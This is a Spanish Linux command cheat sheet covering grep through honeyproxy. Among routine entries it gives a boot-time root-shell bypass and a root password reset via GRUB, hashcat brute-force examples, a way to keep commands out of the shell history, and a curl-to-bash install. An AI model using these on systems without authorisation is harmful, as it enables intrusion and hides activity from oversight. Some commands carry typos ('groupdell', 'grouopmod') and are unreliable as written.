$ grep -v 'fstab' /etc/fstab (Muestra las que no tienen el patrón)
$ grep -E 'fstab|dev' /etc/fstab (Mostras las lineas que contengan dos palabras. Requiere habilitar las expresiones regulares extendidas [ver])
$ grep -e 'fstab' -e 'dev' /etc/fstab (Forma de mostrar las lineas que contengan dos palabras sin habilitar las expresiones regualres extendidas)
$ grep -r 'fstab' /etc (Buscar una palabra de un directorio y los subdirectorios)
$ grep -l -r 'fstab' /etc (Sólo mostrar los archivos que contienen la palabra en el directorio y los subdirectorios)
$ grep -n 'fstab' /etc/fstab (Mostrar la linea y el número de linea)
$ grep -A 2 'swap' /etc/fstab (Mostrar la línea de la ocurrencia [swap] y las 2 siguientes)
$ grep -B 1 'swap' /etc/fstab (Mostrar la linea de la ocurrencia [swap] y la anterior)
$ grep --color UUID /etc/fstab (Resaltar en color la palabra "UUID")
Otras opciones:
$ grep -Fx -f archivo1 archivo2 (Mostrar líneas que aparezcan en dos archivos)
# grep -i -a -B35 -A90 'palabreja' /dev/sda1 > recup.txt (recuperar un archivo borrado con rm que incluye la palabra “palabreja” y su tamaño estimado: [-B50] 35 lineas anteriores a “palabreja” y [-A90] 90 lineas posteriores. Especificar partición y archivo de recuperación)
$ grep cups /etc/services (Conocer el puerto por el que corre un servicio)
$ grep 631 /etc/services (Conocer el servicio por el que corre un puerto)
$ grep -s 'palabra' (Suprime los mensajes de error sobre ficheros que no existen o no se pueden leer)
Buscar tres palabras al inicio de la linea [escapando la barra vertical] de un archivo:
	$ mysqldump --help | grep ^routines\|^trigg\|^user -E
1.- Borrar directorios y/o archivos dejando alguno [borrar todo menos DIR3 i los archivos que contengan "archi"]:
$ ls | grep -v DIR3 | grep -v archi | xargs -d"\n" rm -rf


grive
[gdrive]. Permite sincronizar cualquier carpeta local con el servicio de almacenamiento online de Google. En Ubuntu: add-apt-repository ppa:nilarimogard/webupd8
$ mkdir grive (crear una carpeta para sincronizar archivos)
$ cd grive (Entrar en la carpeta)
$ grive -a (Mostrará una URL que debe copipastearse al navegador, preferiblemente chromium, y este nos mostrará un código que ha de copipastearse a la consola, tras lo cual empieza el sincronización)
A partir de este momento siempre que entremos en la carpeta gdrive podremos sincronizarla con el almacenamiento de Google lanzando:
$ grive


groupadd
Crear un nuevo grupo
# groupadd oficina


groupdel
Borrar un grupo.
# groupdell oficina


groupmod
Renombrar grupos.
# grouopmod -n nuevo_grupo viejo_grupo


groups
Muestra los grupos a los que pertenece el usuario.
$ groups usuario  (El usuario especificado)
$ groups  (Sin especificar usuario muestra los del usuario con el que estamos)


growisofs
Grabación de dvds.
$ growisofs -dvd-compat -Z /dev/sdb=imagen.iso


grpck
Chequea las sintaxis correcta de los ficheros /etc/group y /etc/gshadow.
# grpck (Una salida vacia indica que todo es correcto)
# grpck -r (gerera un informe)


grterminal
Biblioteca de Golang para generar códigos QR en la terminal.
$ qrterminal https://github.com/mdp/qrterminal -l M (corrección de errores M, "media" por defecto "L")
$ qrterminal http://github.com


grub
Gestor de arranque de sistemas operativos del pc.
# update-grub (reconfigurar grub)
# grub-install --root-directory=/media/floppy fd0 (crear un disquete de arranque)
# grub-install --root-directory=/mnt/sda1 --recheck /dev/sda (indica el directorio donde procede grub, parecido al comando anterior)
1.- Si grub no ve algún sistema operativo del pc.
# nano /etc/default/grub
Asegurarse que está decomentada la siguiente linea:
           GRUB_DISABLE_OS_PROBER=false
Y luego:
# apt install os-prober (si no está instalado)
# os-prober (detectar los sitemas operativos del pc)
# grub-mkconfig -o /boot/grub/grub.cfg (entrarlos en grub)
# update-grub (reconfigurar grub)


grub2
Gestor de arranque. Los dispositivos empiezan por 0 y las particiones empiezan con 1. “sda1” es “hd0,1” y no “hd0,0” como en el antiguo grub.
1.-
Modificación de parámetros generales:
# gedit /etc/default/grub
	GRUB_DEFAULT= 0/saved (0 selecciona primera entrada, 1 la segunda... "saved" selecciona la última entrada  ejecutada.)
	GRUB_TIMEOUT=10 (tiempo de espera antes de arrancar)
	GRUB_HIDDEN_TIMEOUT=0  (esconder el menú de entradas. Si hay varios sistemas comentarlo)
	GRUB_HIDDEN_MENU_QUIET=true (oculta la cuenta atrás. "false" la muestra)
	GRUB_DISTRIBUTOR=lsb_release -i -s 2> /dev/null || echo Debian (determina el nombre del sistema)
	GRUB_CMDLINE_LINUX="acpi_osi=Linux" (opciones concretas que pueden pasarse al arranque)
	GRUB_CMDLINE_LINUX_DEFAULT="splash noapic" (otras opciones por defecto)
	GRUB_GFXMODE=1024x768 (activa el grub gráfico)
	GRUB_DISABLE_LINUX_RECOVERY="true" (muestra la opción de recovery mode en el menú. “false lo suprime)
# update-grub2   (hacer efectivos los cambios)
2.-
Para que no aparezca memtest en el menú:
# chmod -x /etc/grub.d/20_memtest86+
El mismo comando con “+x” lo restituye.
# update-grub2
3.-
Quitar lineas que hacen referencia a kernels antiguos:
# dpkg --get-selections | grep linux-image  (averiguar los instalados)
# apt-get remove --purge linux-image-2.6.xx-xx-generic
El update-grub2 se hará de forma automática.
4.-
Cambiar la imagen de fondo [apt-get install grub2-splashimages]. Si se quieren hacer con gimp, estas han de tener un tamaño de  640×480 pixeles y extensión .tga
$ ls /usr/share/images/grub   (directorio de la imágenes)
# gedit /etc/grub.d/05_debian_theme
Y modificamos en la linea:
WALLPAPER="/usr/share/images/grub/Lake_mapourika_NZ.tga"
# update-grub2
5.-
Reinstalar grub2 desde un live-cd o desde otra partición.
# fdisk -l   (para saber la partición del grub que queremos instalar)
# mount /dev/sda2 /media/sda2  (motar la partición)
# mount -o bind /dev/ /media/sda2/dev/  (montar los sistemas de ficheros)
# mount -o bind /sys/ /media/sda2/sys/
# mount -o bind /proc/ /media/sda2/proc/
# chroot /media/sda2    (Chorootear la partición que alberga el grub que vamos a instalar)
# grub-install /dev/sda   (instalar grub en el disco)
6.-
Para solucionar el problema de que al arrancar un sistema operativo la pantalla no muestra nada, editar el archivo:
# nano /etc/default/grub
Y en la linea:
GRUB_CMDLINE_LINUX_DEFAULT="quiet"
Añadir el chipset de vuestra gráfica:
	General (para cualquier gráfica): nomodeset
	ATI (driver libre ati o radeon): radeon.modeset=0
	ATI (driver privativo): nomodeset
	nVidia: xforcevesa o nomodeset
	Nvidia con driver libre (nouveau): nouveau.modeset=0
	Intel: i915.modeset=0
Quedando la entrada, por ejemplo para una Intel; como sigue:
	GRUB_CMDLINE_LINUX_DEFAULT="quiet i915.modeset=0"
7.-
Modificar los colores de las fuentes para adaptarlas a las imágenes mostradas.
# gedit /etc/grub.d/05_debian_theme
y modificar las líneas
set menu_color_normal=white/black
set menu_color_highlight=black/light-gray
color_normal (los que se utilizan por defecto)
color_highlight (los que se utilizan para la entrada seleccionada).
El primero de los 2 colores de cada uno de estos campos se refiere al color de la fuente, y el segundo, al color de fondo.
Colores permitidos:
	red (rojo)
	green (verde)
	blue (azul)
	yellow (amarillo)
	cyan (cian)
	magenta (magenta)
	white (blanco)
	black (negro)
	light-gray (gris claro)
8.-
Colocar contraseña a grub2 para dos usuarios:
# nano /etc/grub.d/00_header
Colocar al final:
cat << EOF
set superusers=”usuario1”
password usuario1 la_contraseña
password usuario2 otra_contraseña
EOF
9.-
Para que en el grub2 salga la partición de windows del sistema pero no otras particiones ntfs (de recuperación, HP, ….)
$ gedit /boot/grub/grub.cfg
Copiar el menuentry perteneciente a la partición windows (no la de recuperación) y pastearla en:
# gedit /etc/grub.d/40_custom
Luego:
# gedit /etc/default/grub
Y añadir al final del archivo la linea:
GRUB_DISABLE_OS_PROBER=true
Recargar grub:
# update-grub
Nota.- Las entradas de 40_custom no se muestran en la salida de la consola pero quedan reflejadas en el grub.cfg
10.-
Poner contraseña a grub2
# grub-mkpasswd-pbkdf2 (Crear la contraseña encriptada en SHA512)
# nano /etc/grub.d/00_header
Y colocar al final del archivo:
cat << EOF
set superusers="usuario"
password_pbkdf2 usuario contraseña_SHA512
EOF
# nano /etc/grub.d/10_linux
Buscar la linea:
printf "menuentry '${title}' ${CLASS} {\n" "${os}" "${version}"
Y colocar al usuario al final de {CLASS}:
printf "menuentry '${title}' ${CLASS} --users usuario {\n" "${os}" "${version}"
# update-grub
11.-
Entrar como root desde grub sin contraseña:
	1.- Cuando sale el menú de grub desplazarse al sistema que se quiere arrancar y pulsar la letra "e"
	2.- moverse a la linea del kernel
En este punto puede optarse por dos soluciones:
	a) borrar todo desde después de "ro" hasta el final y colocar init=/bin/bash [linux   /boot/vmlinuz-3.2.0-4-amd64 root=UUID=de1d7793-c3d2-4e03-b79d-1a76905619e6 ro init=/bin/bash ]. El teclado estará en inglés.
	b) ponemos al final de la linea "single" [linux   /boot/vmlinuz-3.2.0-4-amd64 root=UUID=de1d7793-c3d2-4e03-b79d-1a76905619e6 ro  quiet single ]
Y proseguir con el arranque pulsando F10 o Ctrl+x con lo que el sistema iniciará con una consola root.
12.-
Otra forma de entrar en el sistema cuando se ha perdido la contraseña de root y no se dispone de un live CD:
	1.- Reiniciar y cuando aparece grub, pulsar la tecla "e"
	2.- Buscar la linea en la que aparece algo como "init=/bin/bash" y modificar el parámetro de read-only (ro) por read-write (rw).
	3.- Pulsar F10 para guardar cambios y reiniciar el equipo.
	4.- Aparecerá un prompt shell en el que pondremos:
	    mount -n -o remount,rw /
	    passwd root (ponemos nueva contraseña)
	    exec /sbin/init (reiniciamos)
13.-
Modificar el sistema que arranca primero.
# gedit /boot/grub/grub.cfg
Y modificar la linea que pone:
	set default="2"
Arrancará el sistema situado en la 3ª linea que aparece en el menú (La primera linea es la 0)


grub-mkconfig
Generar un fichero de configuración para grub [grub.cfg]
# grub-mkconfig -o /boot/grub/grub.cfg
Despues instalar en el MBR [grub-install /dev/sda]


grub-mkpasswd-pbkdf2
Crear una contraseña para una entrada de grub2
# grub-mkpasswd-pbkdf2
Se entra la contraseña y se confirma. Saldrá una codificación del tipo:
Your PBKDF2 is grub.pbkdf2.sha512.10000.F2FE383.....
Editar grub.cfg
# nano /boot/grub/grub.cfg
Colocar al final de la parte comentada (#):
set superusers="NOMBRE_USUARIO"
password_pbkdf2 NOMBRE_USUARIO grub.pbkdf2.sha512.10000.F2FE383.....
Especificando el nombre del usuario y copipasteando la clave codificada que nos ha dado el comando anterior. Finalmente en la entrada [menuentry] que se quiere proteger inmediatamente después de las comillas ['....'] indicando el nombre del sistema operatico:
	--users NOMBRE_USUARIO
El resultado sería:
menuentry 'Ubuntu, amb Linux 3.2.0-24-generic (mode de restabliment)' --users NOMBRE_USUARIO --class ubuntu --class gnu-linux ....


grun
Lanzador de aplicaciones GTK.


gs
Visualizar y unir archivos pdf y ps [GhostScript].
$ gs archivo.ps
$ gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=1+2.pdf 1.pdf 2.pdf (unir dos pdfs)
$ gs -q -sPAPERSIZE=a4 -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=1+2.pdf 1.pdf 2.pdf  (Especificando medida de página)
$ gs -q -dNOPAUSE -dBATCH -sDEVICE=pswrite -sOutputFile=1+2.ps 1.ps 2.ps (Unir dos ps)


gsettings
Herramienta de configuración. Equivalente a gconftool-2 [gconf-editor] pero para gnome3 [dconf-editor]
$ gsettings set com.canonical.indicator.session show-real-name-on-panel false (Borrar el nombre del panel de unity)
$ gsettings set com.canonical.indicator.sound blacklisted-media-players "['xmms2']" (añadir aplicaciones en el menú de sonido)
Opciones
help (Muestra informacion)
list-schemas (Lista de esquemas instalados)
list-relocatable-schemas (Lista los que pueden ser modificados)
list-keys (Lista las claves de un esquema)
list-children	 (lista los procesos hijos de un esquema)
list-recursively (Lista claves y valores recursivamente)
range (Consulta el rango de la clave)
get (Obtine el valor de una clave)
set (Establece el valor de una clave)
reset (Reinicia el valor de la clave)
reset-recursively (Reinicia los valores de todo un esquema)
writable (Comprueba si un clave es modificable)
monitor (Hace un seguimiento por si hay cambios)


gt5
Proporciona un listado del uso del disco duro y se puede navegar por él. El programa muestra lo que ha sucedido desde la última ejecución y muestra el tamaño del directorio y el porcentaje total.
$ gt5 /home/user/ --debug (crea un archivo /tmp/gt5XXXXXXX/gt5.html)
$ gt5 /home/user/ --discard (lo muestra en pantalla sin guardar. "q" para salir)
$ gt5 /home/user/ --discard --save-state (lo guarda en el mismo directorio /tmp/gt5XXXXXXX/)


gthd
Es un demonio activado por DBus que proporciona información sobre zonas térmicas, celdas de enfriamiento y puntos de calientes. Este paquete contiene el demonio y el ejecutable gthcli. Primero lanzar el demonio:
$ gthd
Y despues comprobar la información:
$ gthcli


gtop
Herramienta de monitoreo usando la terminal. Muestra información del rendimiento del sistema, uso del disco, memoria, CPU y red y muestra los porcentajes. (<https://github.com/aksakalli/gtop>)
Instalación:
	# curl -sL https://deb.nodesource.com/setup_8.x | bash -
	# apt-get install -y nodejs
	# npm install gtop -g
$ gtop (lanzar la herramienta)
Algunas teclas que se pueden usar:
    p (ordenar por PID)
    c (Por uso de CPU)
    m (Por uso de memoria)
    flechas aArriba/abajo (navegar por los procesos en ejecución)


gtypist
Programa para aprender mecanografia en ncurses.


guake
Emulador de terminal emergente. Una vez iniciado el servicio colocándola en la aplicaciones de inicio o con:
$ guake
La terminal aparecerá o desaparecerá pulsando la tecla F12
$ guake -p (arranca las preferencias. En algunas distros ha de lanzarse desde el propio guake)
Para una personalización más exhaustiva:
# nano /usr/lib/guake/guake.py (En Arch: nano /usr/bin/guake)
width = 80 (Modificar archura, por defecto 100% de la pantalla)
if halignment == ALIGN_CENTER: (Centrada)


guake-indicator
permite administrar comandos personalizados. guake-indicator construye el menú de acuerdo con el archivo XML ~/.guake.indicator/guake-indicator.xml, si este archivo de configuración no existe, se creará uno predeterminado. Aunque guake-indicator tiene un editor de menú incorporado, se puede personalizar este archivo según necesidades con un editor de texto como base para agregar nuevas entradas. Los campos se explican por sí mismos, sin embargo, daré una pequeña descripción de cada uno:
        menu_name (nombre que aparecerá en el propio indicador)
        tab_name (nombre de la pestaña de la terminal de guake una vez que se abre)
        command_after_login (comando para enviar a Guake a través de la interfaz DBUS)
        dont_show_guake (Si se establece en yes, guake-indicator no pedirá que muestre su ventana principal)


guake-toggle
Alternar la visibilidad de guake. Con este comando se puede ocultar/mostrar guake-terminal.
$ guake-toggle


gucharmap
Permite navegar a través de todos los caracteres y categorías Unicode disponibles para las fuentes instaladas y examinar sus propiedades detalladas. Abre en mapa de caracteres en pantalla gráfica.
$ gucharmap
$ gucharmap --font 'Purisa 20'


gunzip
Descomprime archivos gz comprimidos con gzip.
$ gunzip archivo.txt.gz


guessnet
Herramienta de detección de redes no agresiva para usar cuando se mueve una máquina entre redes que no necesariamente proporcionan DHCP. Al hacer ifup eth0, guessnet verificara si eth0 tiene que activarse como hogar o oficina. Para ello utiliza la información almacenada en las definiciones de las interfaces lógicas. En el archivo /etc/network/interfaces han de constar los datos de las redes.
# nano /etc/network/interfaces
auto eth0
mapping eth0
        script guessnet-ifupdown
        map timeout: 10
        map default: none
iface hogar inet static
        address 192.168.1.16
        netmask 255.255.255.0
        gateway 192.168.1.1
        test1 peer address 192.168.1.1 mac 00:11:22:33:44:55
        test2 peer address 192.168.1.2 mac 00:55:44:33:22:11
iface oficina inet static
	address 192.168.0.45
	netmask 255.255.255.0
	gateway 192.168.0.254
	test1 peer address 192.168.0.254 mac 00:55:66:77:88:99
	test2 peer address 192.168.0.1   mac 00:99:88:77:66:55
# default dhcp for none
        iface none inet dhcp


gv
Visor de ps y pdf.
$ gv --grayscale --infoErrors --center out.pdf (en gris, sin mostrar los errores y centrado)


gxmessage
Dejar mensajes en la pantalla
$ gxmessage -center -fg red -bg black "No cierren la terminal"
-fg (Color de fuente)
-bg (Color de fondo)
-center (En el centro de la pantalla)
-iconic (Minimizado en el panel)
-nearmouse (Se abre donde está el cursor)
-entry (Con un cuadro de dialogo pera entrar una respuesta)


gzexe
Comprime ficheros ejecutables que al ser invocados se autodescomprimen para ejecutarse. Esta utilidad sólo se aplica en equipos con discos muy pequeños.
# gzexe /bin/ls
Creará dos archivos: "/bin/ls" y "/bin/ls~". El original es el ls~ que podrá borrarse una vez comprobado que lanzando "ls" en consola, funciona correctamente.


gzip
(gz). Comprime un fichero substituyendolo por un .gz (ni empaqueta ni comprime directorios). Consta de varios ejecutables: gunzip (descomprimir .gz), gzexe (codifica porcentajes de un ejecutable sin modificar el nombre y se ejecutan igualmente), zcat (muestra el contenido de un .gz por la pantalla), zcmp (ejecuta cmp en comprimidos .gz), zdiff (ejecuta diff entre un archivo .gz y el mismo descomprimido si existe en existe en el directorio), zegrep (ejecuta egrep en archivos .gz), zfgrep (ejecuta fgrep en archivos .gz), zforce (fuerza una extensión .gz para que gzip no los comprima de nuevo. Esto puede ser útil cuando los nombres de los archivos se truncaron durante una transferencia de archivos), zgrep (ejecuta grep en archivos .gz), zless (ejecuta less en archivos .gz), zmore (muestra el contenido de un .gz por la pantalla), znew (recomprime archivos de formato compress [.Z] a formato gzip [.gz])
$ gzip -r fichero (Comprimir)
$ gzip -9 archivo (Con compresión máxima)
$ gzip -d fichero.gz (Descomprimir)
$ gzip -c fichero.gz (Ver contenido)
$ gzexe datos.sh (si lo abrimos con un editor veremos parte codificada pero podrá ejecutarse normalmente con ./datos.sh)


hachoir-metadata
Ver entrada python-hachoir-metadata


hal-device
Crea, suprime y muestra dispositivos
$ hal-device -a dispositivo  (añadir)
$ hal-device -r dispositivo   (borrar)
$ hal-device | grep volume.label  (mostrar etiquetas de todos los volumenes)


halt
[poweroff, reboot]. Se puede utilizar para detener, apagar o reiniciar la máquina. Los tres  comandos tienen las mismas opciones.
$ halt --halt (Detener la máquina, independientemente de cuál de los tres comandos se invoque)
$ halt --reboot (Reiniciar la máquina, independientemente de cuál de los tres comandos se invoque)


hardlink
Herramienta que detecta archivos iguales y los reemplaza con enlaces duros.
# hardlink -f -x /videos -t -o /home/usuaario (Enlazar archivos con el mismo nombre [f], excluyendo el directorio "videos" [x], comprobando aunque la fecha de modficación sea diferente [t], ignorando el propietario [o] y sobre la carpeta personal)
# hardlink -n /home/usuario (Hacer una simulación)


haroopad
Procesador de textos en markdown que al dividir la pantalla en dos, permite visualizar el resultado directamente. Descargar de github <https://github.com/rhiokim/haroopad>
$ haroopad -f archivo.md
$ haroopad --mode view archivo.md (Abrir el archivo sólo en modo lectura)
$ haroopad --mode edit archivo.md (Abrir el archivo sólo en modo edición)


hasciicam
Visualizar la webcam via ascii.
$ hasciicam -m html -c 50 -o (En modo html, contraste 50 [de 0 a 100. Por defecto 4] y guardar el archivo)
Otras opciones:
-i /dev/xxxx (Especificando dispositivo.Por defecto /dev/video)
-o archivo (Guardar imagen en archivo. Se reescribe según el parámetro -r. Si no se especifica salida, por defecto es hasciicam.html [para html] y hasciicam.txt [para txt])
-r 1 (Refrescar imagen cada 1 segundo. Por defecto 2. No afecta al modo live)


hash
Lista de los últimos comandos usados y la frecuencia.
$ hash
$ hash -l
$ hash -d date (borrar la entrada date del listado)
$ hash -r (borrar todo el listado)


hashcat
herramienta de recuperación de contraseñas utilizada para realizar ataques de fuerza bruta sobre hashes.
$ hashcat -a 3 -m 0 hash.txt ?d?d?d?d?d ("a 3" que se realizará un ataque de fuerza bruta a un hash MD5 "m 0", con contraseñas numéricas de 5 dígitos "?d?d?d?d?d")
$ hashcat -a 0 -m 1400 hash.txt diccionario.txt ("a 0" que se hará un ataque de diccionario a un hash SHA-256 "m 1400". diccionario.txt contiene las posibles contraseña)
$ hashcat -a 3 -m 0 hash.txt ?1?1?1?1?1?1?1 (combinando mayúsculas, minúsculas y números. "?1" define un conjunto de caracteres a utilizar)
$ hashcat -a 0 -m 0 hash.txt diccionario.txt --force (recuperar contraseña con "force" permite a hashcat usar la GPU)


hash-identifier
Se le especifica un hash y la herramienta lo estudia y muestra el tipo más probable que podría ser [Possible Hashs] y los menos probables [Least Possible Hashs]. Descarga: <https://code.google.com/p/hash-identifier/downloads/list>
$ python Hash_ID_v1.1.py
Cuando sale el promt pastear el hash:
HASH: caf90169eefa5f807d577486b9f795ab86ae2983c5c20806cff959117e90af18
	Possible Hashs:
	[+]  SHA-256
	[+]  Haval-256
	Least Possible Hashs:
	[+]  GOST R 34.11-94
	[+]  RipeMD-256
	[+]  SNEFRU-256
	[+]  SHA-256(HMAC)
	[+]  Haval-256(HMAC)
	[+]  RipeMD-256(HMAC)
	[+]  SNEFRU-256(HMAC)
	[+]  SHA-256(md5($pass))
	[+]  SHA-256(sha1($pass))


hashalot
Entrar una frase y muestra su hash. Soporta: ripemd160, rmd160, rmd160compat, sha256, sha384 y sha512
$ hashalot -x sha256 (En binario [x])
	Enter passphrase:
	c9168d9f82c8d04dcaea564c9dfbdd4924b26cfec589e739fdac346af936a542
Nota.- la frase entrada y que no se muestra en el prompt es: linux es genial


hashid
Identificar diferentes tipos de hashes utilizados para cifrar datos y especialmente contraseñas. es una herramienta escrita en Python 3.x que admite la identificación de más de 175 tipos de hash únicos mediante expresiones regulares. Es capaz de identificar un único hash o analizar un archivo e identificar los hashes que contiene. También hay disponible una versión nodejs de hashID que se configura fácilmente para proporcionar identificación de hash en línea.
$ hashid -e caf90169eefa5f807d577486b9f795ab86ae2983c5c20806cff959117e90af18
$ hashid -m 89939edf840d6edd260dcf326eb71beed79f776d -o file (incluir el modo hashcat en la salida y guardarla en file)


hashtag
Analiza e identifica varios hashes de contraseñas en función de su tipo. Descarga de <https://github.com/SmeegeSec/HashTag>
# hashtag -sh $1$MtCReiOj$zvOdxVzPtrQ.PXNW3hTHI0 (Analizar uno sólo)
# hashtag -f archivo (Analizar todos los hash contenidos en un archivo)
# hashtag -d dir -o archivo (recorrer un directorio y todos los subdirectorios intentando identificar todos los hash potenciales y mandando el resultado a un archivo. Si no se especifica, la salida es HashTag_Output_File.txt)


hciconfig
Configuración de dispositivos bluetooth.
# hciconfig -a (Para saber cual es el dispositivo)
# hciconfig hci0 up (Levantar el dispositivo)
# hciconfig hci0 down (Parar el dispositivo)
# hciconfig hci0 revision (Información completa del dispositivo)
# hciconfig hci0 piscan  (activar visivilidad de la exploración)
# hciconfig hci0 noscan   (Desactivarla)
# hciconfig -h (Listado completo de comandos disponibles)


hcitool
Busqueda de disposivos bluetooth, siempre que no esten en modo oculto.
$ hcitool scan (Busca dispositivos activos)
$ hcitool info   (Muestra información de los dispositivos encontrados)


hddtemp
Indica la temperatura del disco especificado
# hddtemp /dev/sda
# hddtemp -d /dev/sda (arrancar el daemon)


hdparm
consultar y modificar diferentes parámetros de los discos duros.
# hdparm /dev/sda (Informa del estado [activado o no] de las opciones de hdparm)
# hdparm -tT /dev/sda (Comprobar velocidad de lectura)
# hdparm -i /dev/sda (Informa de las características del disco duro)
# hdparm -I /dev/sda (Mostrar información más extendida)
1.-
Desactivación del APM (Gestión avanzada de energia) de los portatiles ya que esta tecnologia alarga la duración de la batería en detrimento de la vida útil del disco duro.
# hdparm -I /dev/sda
El parámetro que indica si tenemos APM y la frecuencia de ciclo de carga-descarga es:
Advanced power management level: 128
# smartctl -a /dev/sda | egrep 'ID|Load_Cycle'(El parámetro RAW_VALUE indica la  cantidad de ciclos que el HD ha consumido. La cantidad de ciclos oscila entre 300000 y 600000 por HD)
# hdparm -B 254 /dev/sda (Disminuir la frecuencia de los ciclos a mínimo. El valor máximo sería 1 y desactivado 255)
2.-
Minimizar el ruido del disco duro:
# hdparm -I /dev/sda |grep acoustic
Muestra el valor recomendado y el valor actual. Si vemos que el recomendado es menor que el valor actual podemos modificarlo con:
# hdparm -M (VALOR RECOMENDADO) /dev/sda


head
muestra por defecto las primeras 10 lineas de un archivo si no se especifica cantidad.
$ head /var/log/apache2/access.log
$ head -50 /var/log/maillog  (las primeras 50)
$ head -5 archivo1 archivo2 (Muestra las 5 primeras lineas de los dos archivos)


health-check
monitorea los procesos y, opcionalmente, sus procesos secundarios y subprocesos durante un período de tiempo determinado. Al final del monitoreo, mostrará el tiempo de CPU utilizado, los eventos de activación generados y las operaciones de E/S de los procesos dados.
$ health-check -d 10 -p ,emac (monitorear 10 segundos [por defecto 60] el proceso emacs)
$ health-check -d 10 -p 9809 (lo mismo especificando PID)


hegemon
[libsensors4-dev cargo]. Monitoreo del sistema: Velocidad del ventilado, temperatura, CPU, memoria y uso de swap. El intervalo de monitorización es 3 segundos. Al estar escrito en lenguaje RUST, una vez instñalado:
$ cargo install hegemon
Puede requerir incluir la ruta de los ejecutables que usa RUST en el patch:
$ export PATH="$HOME/.cargo/bin:$PATH"
Para ejecutarlo:
$ hegemon


hello
Muestra el clásico "Hola, mundo" o un saludo personalizable.
$ hello -t (El tradicional "Hola, mundo")
$ hello -n (Un "Hola, mundo" de nueva generación)
$ hello -g "Linux es un sistema genial" (Muestra la frase)


help
Muestra los comandos disponibles en bash. Estos comandos no tienen página man, por lo que para acceder a una descripción se usa esta opción.
$ help
$ help fc


help2man
Programa para crear páginas man simples a partir de la salida --help y --version de un programa.
$ help2man --no-discard-stderr script.sh (incluir la salida stderr del script al analizar la salida de la opción)


helpztags
Escanea directorios dados en busca de archivos *.txt y *.txt.gz. Cada archivo es escaneado para encontrar etiquetas utilizadas en los archivos de ayuda de vim. Para cada directorio se genera un archivo de etiquetas adecuado.
$ helpztags Documents/*


heroku
Gestión de los blogs alojados en <http://www.heroku.com> Ver octopress 17.
$ heroku apps:rename nuevo_nombre --app viejo_nombre(Renombrar un blog. Si se hace en la web en algunos casos da problemas)
$ heroku addons (Ver los addons instalados)
$ heroku apps (Muestra los blogs alojados)
$ heroku login (Logearse con el nombre de usuario y contraseña de registro)
$ heroku create (Crea el repositorio en el directorio actual)
$ heroku logs (Muestra los logs)
$ heroku ps (Ver las aplicaciones corriendo en heroku)
$ heroku restart web.1 (Reiniciar la aplicación a aprtir del dato obtenido com ps)
$ heroku apps:destroy mighty-fortress-6385 (Eliminar una app)
$ heroku sharing --app tractatuslapipaplena (Ver los colaboradores de un proyecto)
$ heroku auth:login (Pide los datos de registro)
$ heroku keys:add ~/.ssh/id_rsa.pub (Subir la clave publica)
$ heroku git:remote -a tractatuslapipaplena (Añadir una aplicación Heroku con control remoto Git)


hexdump
[exedit]. Editor de archivos binarios.
$ hexdump -C archivo_binario


hg
[mercurial]. Mercurial es un potente programa de control de versiones para nuestros proyectos. Previamente crear en la carpeta personal, el archivo:
$ nano .hgrc
Con el siguiente contenido:
	[ui]
	username = Juanito Perez juanitoperez@gmail.com
$ hg init repositorio . (crea un repositorio en el directorio actual o en el que se especifique)
$ hg add  (añade los ficheros existentes en el directorio a nuestro proyecto)
$ hg clone http://servidor.com/hg (clona un repositorio a la carpeta actual)
$ hg clone ssh://usuario@servidor.com/carpeta repositorio (clona "carpeta" usando ssh en el directorio "repositorio" del directorio actual)
$ hg status (muestra el estado de los ficheros del proyecto)
$ hg commit (realizamos un commit al proyecto)
$ hg push (enviamos los cambios al repositorio remoto)
$ hg pull (recuperamos cambios del repositorio)
$ hg update (Recargar los archivos despues de un pull)
$ hg update -C (Mezclar cambios [merge])
$ hg log (vemos todos los cambios realizados en el proyecto)
$ hg log -r 5 (Muestra la 5ª revisión)
$ hg log -r 2:5 (Muestra de las 2ª a la 5ª revisión)
$ hg log -p -r 6 (Muestra todas las modificaciónes del archivo de la 6ª revisión)
$ hg tip -v (Muestra los datos de la última revisión)
$ hg help comando (vemos la ayuda integrada del hg para el comando)


hidd
Gestionar dispositivos blueetoth
# hidd --search (Buscar dispositivos)
# hidd --connect 0A:1B:2C:4D:5E:6F (Conectar a un dispositivo)


hipstopgm
[Netpbm]. Lee un archivo HIPS [Human Information Processing Laboratory] como entrada y produce una imagen PGM como salida. Si el archivo HIPS contiene más de una imagen se concatenará todas las imágenes verticalmente.
$ hipstopgm archivo_de_hips


hishrink
Convierte un archivo ASCII HINT, generalmente con la extensión .hint, en un archivo binario HINT, con la extensión .hnt. El formato de archivo HINT basado en ASCII, también llamado formato 'largo', está optimizado para facilitar la lectura. Se puede editar con un editor de texto. Por lo tanto, permite modificaciones simples que serían difíciles de lograr utilizando el formato binario. También es conveniente al depurar. El formato de archivo binario HINT, también llamado formato 'corto', está optimizado para mostrar archivos HINT. El formato de archivo HINT binario está diseñado para la lectura en pantalla de documentos.


history
Lista los comandos utilizados por el usuario
$ history 20       (Lista los últimos 20)
$ history -c        (Elimina el historial)
$ history -d 125 (Eliminar la orden 125. útil si se escribió la contraseña y esta queda visible en el historial)
$ history -d 100-125 (Eliminar las ordenes de la 100 a la 125)
$ history | awk '{print $2}' | sort | uniq -c | sort -rn | head -10 (lista los 10 comandos más usados y numero de veces)
$ !354  (ejecutará el comando 354 del listado de history)
$ !354:p (lo mostrará sin ejecutarlo)
$ !ls (ejecutará el último "ls" del historial)
$ !ls:p (lo mostrará sin ejecutar)
$ !! (ejecuta el último comando del historial)
$ history | grep cp  (Buscar en el historial las veces que se ha lanzado “cp”)
$ history -a (Guardar el historial sin cerrar la sesión)
$ echo $HISTCMD (número de comandos registrados en history y este tambien queda reflejado en history)
$ history -d $HISTCMD && ip a (ejecuta "ip a" pero no se muestra en el historial)
$ ip a # un comentario (en history aparecerá "ip a # un comentario")


histretch
Traducción de archivos HINT binarios a archivos ASCII. La inversa de los que hace el comando hishrink [ver]


hodie
Muestra la fecha en latín.
$ hodie -n (En numeral)
$ hodie -c -v (De forma clásica)


holes
Busca funcionamientos de cero bytes en los archivos de entrada especificados (o la entrada estándar) e imprime las direcciones de inicio (en hexadecimal) así como las longitudes (en decimal).
$ holes /usr/bin/thunar
$ holes archivo.txt


hollywood
Utilidad que divide la consola en múltiples paneles para crear un autentico melodrama geek de Hollywood. Puede usarse como salvapantallas con un excelente suspenso técnico. Para finalizar la aplicación pulsar C-c
$ hollywood


honeyproxy
[python-pip]. Analiza el tráfico web. Instalación:
# pip install pyOpenSSL pyasn1 Twisted Autobahn
